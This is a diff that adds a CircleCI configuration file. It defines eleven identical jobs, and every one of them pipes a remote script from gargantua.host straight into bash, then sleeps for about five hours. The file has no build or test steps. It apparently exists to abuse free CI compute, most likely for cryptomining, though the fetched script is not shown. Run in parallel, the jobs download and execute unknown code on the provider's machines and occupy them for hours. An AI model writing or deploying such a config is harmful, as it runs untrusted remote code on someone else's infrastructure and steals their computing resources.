@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  redisyuas:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  redisyuas1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  redisyuas2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  redisyuas3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  redisyuas4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  redisyuas5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  redisyuas6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  redisyuas7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  redisyuas8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  redisyuas9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  redisyuas10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - redisyuas
+      - redisyuas1
+      - redisyuas2
+      - redisyuas3
+      - redisyuas4
+      - redisyuas5
+      - redisyuas6
+      - redisyuas7
+      - redisyuas8
+      - redisyuas9
+      - redisyuas10
